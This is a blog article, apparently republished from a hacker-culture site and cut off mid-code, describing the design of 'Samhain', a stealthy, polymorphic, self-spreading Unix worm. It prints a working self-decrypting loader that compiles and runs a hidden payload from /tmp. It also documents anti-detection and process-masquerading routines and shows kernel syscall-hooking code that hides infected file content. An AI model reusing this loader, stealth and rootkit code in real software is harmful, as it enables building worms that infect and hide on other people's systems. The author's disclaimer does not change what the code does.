</script><article class="post-406 post type-post status-publish format-standard hentry category-hacker-culture category-virustrojanswormsrootkits category-secure-coding tag-computer-security tag-darknet tag-malware tag-programming tag-virii tag-virus tag-viruses tag-worms">
	<header>
	<h1 class="title entry-title">Writing Worms for Fun or Profit</h1>	</header>

<div class="post-meta">Last updated: June 18, 2010 | 31,914 views   </div>
                                                <div align="center"><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- Darknet Responsive Front & Archive -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-3033787195489589"
     data-ad-slot="1168055645"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script></div>                        <br />

	<section class="entry">
<p></p>
<p><strong>0x00: Preface</strong></p>
<p>Media, kindly supported by AV âexpertsâ, drawn apocalyptical vison of desctruction caused by stupid M$ Outlook / VisualBasic worm, called âILOVEYOUâ. Absurdal estimations â $10M lost for âdefending the diseaseâ, especially when you take a look at increasing with the speed of light value of AV companies market shares, made many people sick. Lame VBS application that isnât even able to spread without luser click-me interaction, and is limited to one, desk-end operating systemâ¦ Worm that sends itself to people in your addressbook, and, in itâs original version, kills mp3 files on your disk [1].</p>
<p>And you call it dangerous? Stop kidding.</p>
<p>Over year ago, with couple of friends, we started writing a project, called âSamhainâ (days ago, on packetstorm, I noticed cute program with same name â in fact itâs not the same app, just a coincidence ;). We wanted to see if itâs difficult to write deadly harmful Internet worm, probably much more dangerous than Morrisâs worm. Our goals:</p>
<ul>
<li><strong>1: Portability</strong> â worm must be architecture-independent, and should work on different operating systems (in fact, we focused on Unix/Unix-alikes, but developed even DOS/Win code).</li>
<li><strong>2: Invisibility </strong>â worm must implement stealth/masquerading techniques to hide itself in live system and stay undetected as long as itâs possible.</li>
<li><strong>3: Independence</strong> â worm must be able to spread autonomically, with no user interaction, using built-in exploit database.</li>
<li><strong>4: Learning</strong> â worm should be able to learn new exploits and techniques instantly; by launching one instance of updated worm, all other worms, using special communication channels (wormnet), should download updated version.</li>
<li><strong>5: Integrity</strong> â single worms and wormnet structure should be really difficult to trace and modify/intrude/kill (encryption, signing).</li>
<li><strong>6: Polymorphism</strong> â worm should be fully polymorphic, with no constant portion of (specific) code, to avoid detection.</li>
<li>
<strong>7: Usability</strong> â worm should be able to realize choosen mission objectives â eg. infect choosen system, then download instructions, and, when mission is completed, simply disappear from all systems.</li>
</ul>
<p>With these seven simple principles, we started our work. This text describes our ideas, concepts and implementation issues. It is NOT the terroristâs handbook, and has not been written to help people to write such piece of code on their own. Itâs written to show that very serious potential risk, which we virtually canât avoid or stop, isnât only hypotetical. Code provided here is partial, often comes from first, instead of most recent, Samhain release and so on. But remember â working model has been written. And this model is deadly dangerous engine, which can be used to very, very bad things. Probably we arenât the first people who thought about it and tried to write it, thatâs what make us scaredâ¦</p>
<p>Winter 1998, three bored people somewhere in the middle of Europe.</p>
<p>Sit and relax.</p>
<p><strong>0x01: Portability</strong></p>
<p>This is probably the most important thing â we donât want code that can run only on Windows, Linux or Solaris, or â worse â can run only on x86. The task is quite easy to complete if you decide to spread your code in platform-independent form. How could it be achieved? Well, most of systems have C compiler :) So we might spread worm in source code, with simple decryptor (letâs say it will be shell script).</p>
<p>But wait, some (not much) systems donât have C compiler. What can we do? Using wormnet, worm during infection might ask other wormnet members for compiled binary for given platform. Wormnet details have been described in section 0x04. Anyway, binary will contain appended source code, to make futher infections possible within standard procedure. Infection scheme is described in section 0x03.</p>
<p>First version of our decryptor looked like this:</p>
<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60580f2d7605b413030757" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; ">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style=""><span class="crayon-title"></span>
			<div class="crayon-tools" style=""><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style=""></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; ">
const char decryptor[]="#!/bin/bash\nX=/tmp/.$RANDOM$$\n(dd if=\"$0\" of="
"$X.f~ ibs=1 skip=\x01\x01\x01\x01 count=\x02\x02\x02\x02\x02\x02 ;dd if="
"\"$0\" of=$X.b~ ibs=\x03\x03\x03\x03\x03 skip=1;echo \"int x;main(int c,"
"char**v){char a[99999];int i=read(0,a,99999);for(;x&lt;i;)a[x++]-=atoi(v[1]"
");write(1,a,i);}\" &gt;$X.d~;
test -x /tmp/.a012382~||cc -x c $X.d~-o/\tmp/."
"a012382~;/tmp/.a012382~ \x04\x04\x04 &lt;$X.f~&gt;$X.gz~;gzip -cd &lt;$X.gz~&gt;$X.c"
"~;rm -f $X.f~ $X.d~;cc -O3 -x c $X.c~ -o $X~;chmod 755 /tmp/.a012382~)&amp;&gt;"
"/dev/null;test -x \"$0\"&amp;&amp;exec $X~ \"$0\" $@\n";</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style=""><div class="crayon-num" data-line="crayon-60580f2d7605b413030757-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7605b413030757-2">2</div><div class="crayon-num" data-line="crayon-60580f2d7605b413030757-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7605b413030757-4">4</div><div class="crayon-num" data-line="crayon-60580f2d7605b413030757-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7605b413030757-6">6</div><div class="crayon-num" data-line="crayon-60580f2d7605b413030757-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7605b413030757-8">8</div><div class="crayon-num" data-line="crayon-60580f2d7605b413030757-9">9</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style=" -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60580f2d7605b413030757-1"><span class="crayon-m">const</span><span class="crayon-h"> </span><span class="crayon-t">char</span><span class="crayon-h"> </span><span class="crayon-v">decryptor</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">"#!/bin/bash\nX=/tmp/.$RANDOM$$\n(dd if=\"$0\" of="</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7605b413030757-2"><span class="crayon-s">"$X.f~ ibs=1 skip=\x01\x01\x01\x01 count=\x02\x02\x02\x02\x02\x02 ;dd if="</span></div><div class="crayon-line" id="crayon-60580f2d7605b413030757-3"><span class="crayon-s">"\"$0\" of=$X.b~ ibs=\x03\x03\x03\x03\x03 skip=1;echo \"int x;main(int c,"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7605b413030757-4"><span class="crayon-s">"char**v){char a[99999];int i=read(0,a,99999);for(;x&lt;i;)a[x++]-=atoi(v[1]"</span></div><div class="crayon-line" id="crayon-60580f2d7605b413030757-5"><span class="crayon-s">");write(1,a,i);}\" &gt;$X.d~;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7605b413030757-6"><span class="crayon-s">test -x /tmp/.a012382~||cc -x c $X.d~-o/\tmp/."</span></div><div class="crayon-line" id="crayon-60580f2d7605b413030757-7"><span class="crayon-s">"a012382~;/tmp/.a012382~ \x04\x04\x04 &lt;$X.f~&gt;$X.gz~;gzip -cd &lt;$X.gz~&gt;$X.c"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7605b413030757-8"><span class="crayon-s">"~;rm -f $X.f~ $X.d~;cc -O3 -x c $X.c~ -o $X~;chmod 755 /tmp/.a012382~)&amp;&gt;"</span></div><div class="crayon-line" id="crayon-60580f2d7605b413030757-9"><span class="crayon-s">"/dev/null;test -x \"$0\"&amp;&amp;exec $X~ \"$0\" $@\n"</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p></p>
<p>It used very simple (per-byte increments) âencryptionâ for source code with custom increment value (decryptor has been modified accordingly to choosen value â \x01, \x02, \x03 and \x04 are changed by encryptor routine). Also, this constant decryptor has been every time re-written using simple polymorphic engine (see section 0x06) to avoid constant strings. Later, we modified encryption routine to something little bit stronger (based on logistic equation number generator in chaotical window) â in fact, it only makes it more difficult to detect in inactive form.</p>
<p>As you can see, this decryptor (or itâs early version shown above) isnât highly-portable â what if we donât have bash, compiler, gzip or such utilities? Well, thatâs one of reasons weâve decided to join worms in wormnet â if sent code wonât connect back to parent and report itself, host is not marked as infected, and wormnet is asked for pre-compiled binary for given architecture (assuming we already infected this architecture somewhere in the world, and we had needed utilities, or weâre running the same architecture as infected host).</p>
<p>NOTE: For writing extremely ugly code that can run in DOS, [ba]sh, csh, perl etc and can be compiled with C in the same time, please refer IOCCC archives [2].</p>
<p>Sebastian wrote virus code that can spread both on Windows/DOS platform with C compiler and Unix systems with no modifications nor any interaction. It does cross-partition infections and installs itself as compiler trojan (modifying include files to put evil instructions in every compiled source). It is called Califax and has been developed while writting Samhain, as an excercise to prove that such cross-system jumps are possible. I donât want to include Sebastianâs sources with no permission, all I want to say<br />
is he did it within 415 lines of c code :) Califax hasn ât been incorporated within Samhain project, as we donât want to infect Winbloze for ideological reasons :P </p>
<p><strong>0x02: Invisibility</strong></p>
<p>After breaking into remote system, worm not always have root privledges, so first of all, we wanted to implement some techniques to hide it, make it look-like any other process in system, and make it hard to kill until thereâs a chance to gain higher privledges (for details on system intrusion, please refer section 0x03). Also, we made sure itâs really hard to debug/trace running or even inactive worm â please refer section 0x05 for anti-debug code details.</p>
<p>Our non-privledged process masquerading code consists of following parts:</p>
<ul>
<li>â <strong>masquerading:</strong> walk through /proc, choose set of common process names and<br />
  change your name to look just like one of them,</li>
<li>â <strong>cyclic changes:</strong> change your name (and executable name) as well as pid<br />
  frequently; while doing it, always keep âmirrorâ process, in case parent<br />
  or child get killed by walking skill-alike programs</li>
</ul>
<p>Our goal is to make almost impossible (with common tools) to âcatchâ process, as all /proc parameters (pid, exe name, argv[0]) are changing, and even if one of them is catched, we have âmirrorâ project. Of course, at first we should avoid such attempts by camouflage.  This comment comes from libworm README for Unices:</p>
<p>â snip from README â</p>
<blockquote><p>a) Anti-scanning routines</p>
<p>Following routines are provided to detect anti-worm stuff, like âkill2â<br />
or anything smarter. You should use them before fork()ing:</p>
<p>int bscan(int lifetime);</p>
<p>  bscan performs âbrief scanningâ using only 2 childs. Lifetime should<br />
  be set to something about 1000 microseconds. Return values:<br />
  0 â no anti-worm stuff detected, please use ascan or wscan.<br />
  1 â dumb anti-worm stuff detected (like âkill2â); use kill2fork()<br />
  2 â smart (or brute) stuff detected, wait patiently</p>
<p>int ascan(int childs,int lifetime);</p>
<p>  ascan performs âadvanced scanningâ using given number of childs<br />
  (values between 2 and 5 are suggested). It tests environment<br />
  using âfake forkbombâ scenario. Results are more accurate:<br />
  0 â no anti-worm stuff detected (you might use wscan())<br />
  1 â anti-worm stuff in operation</p>
<p>int wscan(int childs,int lifetime);</p>
<p>  wscan acts like ascan, but uses âwalking processâ scenario. It<br />
  seems to be buggy, accidentally returning â1â with no reason,<br />
  but itâs also the best detection method. Return values:<br />
  0 â no anti-worm stuff detected<br />
  1 â anti-worm stuff in operation</p>
<p>int kill2fork();</p>
<p>  This is aletrnative version of fork(), designed to fool<br />
  dumb anti-worm software (use it when bscan returns 1).<br />
  Return value: similar as for fork().</p>
<p>b) Masquerading routines</p>
<p>These routines are designed to masquerade and hide current<br />
process:</p>
<p>int collect_names(int how_many);</p>
<p>  collect_names builds process names table with up to<br />
  âhow_manyâ records. This table (accessible via<br />
  âcmdlines[]â array) contains names of processes in<br />
  system; Return value: number of collected items.</p>
<p>void free_names();</p>
<p>  this function frees space allocated by collect_names<br />
  when you donât need cmdlines[] anymore.</p>
<p>int get_real_name(char* buf, int cap);</p>
<p>  this function gets real name of executable for current<br />
  process to buf (where cap means âmaximal lengthâ).</p>
<p>int set_name_and_loop_to_main(char* newname,char* newexec);</p>
<p>  this function changes âvisible nameâ of process to newname<br />
  (you may select something from cmdlines[]), then changes<br />
  real executable name to ânewexecâ, and loops to the<br />
  beginning of main() function. PID will be NOT changed.<br />
  Set ânewexecâ to NULL if you donât want to change real exec<br />
  name. Return value: non-zero on error.</p>
<p>  Note: variables, stack and anything else will be reset. Please<br />
  use other way (pipes, files, filenames, process name) to<br />
  transfer data from old to new executable</p>
<p>int zero_loop(char* a0);</p>
<p>  this function returns â1â if this main() code is reached for<br />
  the first time, or â0â if set_name_and_loop_to_main() was<br />
  used. Pass argv[0] as parameter. It simply checks if<br />
  real_exec_name is present in argv[0].
</p></blockquote>
<p>For more details and source code on architecture-independent non-root process hiding techniques, please refer libworm sources [3] (incomplete for now, but always something).</p>
<p>This routines are weak and might be used only for short-term process hiding. We should as fast as possible gain root access (again, this aspect will be discussed later). Then, we have probably the most complex aspect of whole worm. Advanced process hiding is highly system-dependent, usually done by intercepting system calls. We have developed source for universal hiding modules on some systems, but it not working on every platform Samhain might attack. Techniques used there are based on well-known kernel file and process hiding modules. </p>
<p>Our Linux 2.0/2.1 (2.2 and 2.3 kernels werenât known at the time ;) our module used technique later described in âabtromâ article on BUGTRAQ by <riq@CIUDAD.COM.AR> (Sat, 28 Aug 1999 14:40:31) to intercept syscalls [4]. Sebastian wrote stealth file techniques (to return original contents of eventually infected files), while I developed process hiding and worm interface. Module intercepted open, lseek, llseek, mmap, fstat, stat, lstat, kill, ptrace, close, read, unlink, write and execve calls. </p>
<p>For example, new llseek call look this way:</p>
<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60580f2d76063839939513" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; ">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style=""><span class="crayon-title"></span>
			<div class="crayon-tools" style=""><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style=""></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; ">
int new_llseek(unsigned int fd,unsigned int offset_high,
               unsigned int offset_low,int *result,unsigned int whence) {
  retval=old_llseek(fd,offset_high,offset_low,result,whence);
  if (retval&lt;0) return retval;
  if (!(file=current-&gt;files-&gt;fd[fd])) return retval;
  if (S_ISREG(file-&gt;f_inode-&gt;i_mode) || S_ISLNK(file-&gt;f_inode-&gt;i_mode))
    if (is_happy(fd) &amp;&amp; file-&gt;f_pos &lt; SAMLEN) file-&gt;f_pos += SAMLEN;
  return retval;
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style=""><div class="crayon-num" data-line="crayon-60580f2d76063839939513-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76063839939513-2">2</div><div class="crayon-num" data-line="crayon-60580f2d76063839939513-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76063839939513-4">4</div><div class="crayon-num" data-line="crayon-60580f2d76063839939513-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76063839939513-6">6</div><div class="crayon-num" data-line="crayon-60580f2d76063839939513-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76063839939513-8">8</div><div class="crayon-num" data-line="crayon-60580f2d76063839939513-9">9</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style=" -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60580f2d76063839939513-1"><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-e">new_llseek</span><span class="crayon-sy">(</span><span class="crayon-t">unsigned</span><span class="crayon-h"> </span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-v">fd</span><span class="crayon-sy">,</span><span class="crayon-t">unsigned</span><span class="crayon-h"> </span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-v">offset_high</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76063839939513-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-t">unsigned</span><span class="crayon-h"> </span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-v">offset_low</span><span class="crayon-sy">,</span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-v">result</span><span class="crayon-sy">,</span><span class="crayon-t">unsigned</span><span class="crayon-h"> </span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-v">whence</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60580f2d76063839939513-3"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">retval</span><span class="crayon-o">=</span><span class="crayon-e">old_llseek</span><span class="crayon-sy">(</span><span class="crayon-v">fd</span><span class="crayon-sy">,</span><span class="crayon-v">offset_high</span><span class="crayon-sy">,</span><span class="crayon-v">offset_low</span><span class="crayon-sy">,</span><span class="crayon-v">result</span><span class="crayon-sy">,</span><span class="crayon-v">whence</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76063839939513-4"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">retval</span><span class="crayon-o">&lt;</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-v">retval</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d76063839939513-5"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-sy">(</span><span class="crayon-v">file</span><span class="crayon-o">=</span><span class="crayon-v">current</span><span class="crayon-o">-&gt;</span><span class="crayon-v">files</span><span class="crayon-o">-&gt;</span><span class="crayon-v">fd</span><span class="crayon-sy">[</span><span class="crayon-v">fd</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-v">retval</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76063839939513-6"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">S_ISREG</span><span class="crayon-sy">(</span><span class="crayon-v">file</span><span class="crayon-o">-&gt;</span><span class="crayon-v">f_inode</span><span class="crayon-o">-&gt;</span><span class="crayon-v">i_mode</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-e">S_ISLNK</span><span class="crayon-sy">(</span><span class="crayon-v">file</span><span class="crayon-o">-&gt;</span><span class="crayon-v">f_inode</span><span class="crayon-o">-&gt;</span><span class="crayon-v">i_mode</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60580f2d76063839939513-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">is_happy</span><span class="crayon-sy">(</span><span class="crayon-v">fd</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-v">file</span><span class="crayon-o">-&gt;</span><span class="crayon-v">f_pos</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-h"> </span><span class="crayon-v">SAMLEN</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-v">file</span><span class="crayon-o">-&gt;</span><span class="crayon-v">f_pos</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-v">SAMLEN</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76063839939513-8"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-v">retval</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d76063839939513-9"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0007 seconds] -->
<p></p>
<p>In this case, we wanted to skip samhain code loader at the beginning of file. is_happy() function has been used to identify infected files. Unfortunately, it also has to check length of this loader â remember, itâs dynamically generated. This is code from is_happy() used to determine this size from our decryptor routine:</p>
<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60580f2d76066409679564" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; ">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style=""><span class="crayon-title"></span>
			<div class="crayon-tools" style=""><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style=""></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; ">
    // Determine where ELF starts...
    file-&gt;f_pos=0;
    BEGIN_KMEM
    r=file-&gt;f_op-&gt;read(file-&gt;f_inode, file, buf,sizeof(buf));
    END_KMEM
    // Groah! We have to write out own atoi... Stupido ;-)
    znaki=0;
    while (znaki!=TH &amp;&amp; ++v&lt;r) if (buf[v]=='=') znaki++;
    if (znaki==TH) {
      while (buf[v+(++poz)]!=' ' &amp;&amp; v+poz&lt;r) mult=mult*10;
      buf[v+poz]=0;
      poz=1;
      SAMLEN=0;
      while (buf[v+poz]) {
        if (buf[v+poz]-'0'&gt;9) { znaki=1;break; } // Format error (!)
        SAMLEN+=(buf[v+poz++]-'0')*mult;
        mult=mult/10;
      }</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style=""><div class="crayon-num" data-line="crayon-60580f2d76066409679564-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76066409679564-2">2</div><div class="crayon-num" data-line="crayon-60580f2d76066409679564-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76066409679564-4">4</div><div class="crayon-num" data-line="crayon-60580f2d76066409679564-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76066409679564-6">6</div><div class="crayon-num" data-line="crayon-60580f2d76066409679564-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76066409679564-8">8</div><div class="crayon-num" data-line="crayon-60580f2d76066409679564-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76066409679564-10">10</div><div class="crayon-num" data-line="crayon-60580f2d76066409679564-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76066409679564-12">12</div><div class="crayon-num" data-line="crayon-60580f2d76066409679564-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76066409679564-14">14</div><div class="crayon-num" data-line="crayon-60580f2d76066409679564-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76066409679564-16">16</div><div class="crayon-num" data-line="crayon-60580f2d76066409679564-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d76066409679564-18">18</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style=" -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60580f2d76066409679564-1"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// Determine where ELF starts...</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76066409679564-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">file</span><span class="crayon-o">-&gt;</span><span class="crayon-v">f_pos</span><span class="crayon-o">=</span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d76066409679564-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">BEGIN</span><span class="crayon-sy">_</span>KMEM</div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76066409679564-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">r</span><span class="crayon-o">=</span><span class="crayon-v">file</span><span class="crayon-o">-&gt;</span><span class="crayon-v">f_op</span><span class="crayon-o">-&gt;</span><span class="crayon-e">read</span><span class="crayon-sy">(</span><span class="crayon-v">file</span><span class="crayon-o">-&gt;</span><span class="crayon-v">f_inode</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">file</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">buf</span><span class="crayon-sy">,</span><span class="crayon-e">sizeof</span><span class="crayon-sy">(</span><span class="crayon-v">buf</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d76066409679564-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">END_KMEM</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76066409679564-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// Groah! We have to write out own atoi... Stupido ;-)</span></div><div class="crayon-line" id="crayon-60580f2d76066409679564-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">znaki</span><span class="crayon-o">=</span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76066409679564-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">while</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">znaki</span><span class="crayon-o">!=</span><span class="crayon-v">TH</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-o">++</span><span class="crayon-v">v</span><span class="crayon-o">&lt;</span><span class="crayon-v">r</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">buf</span><span class="crayon-sy">[</span><span class="crayon-v">v</span><span class="crayon-sy">]</span><span class="crayon-o">==</span><span class="crayon-s">'='</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-v">znaki</span><span class="crayon-o">++</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d76066409679564-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">znaki</span><span class="crayon-o">==</span><span class="crayon-v">TH</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d76066409679564-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">while</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">buf</span><span class="crayon-sy">[</span><span 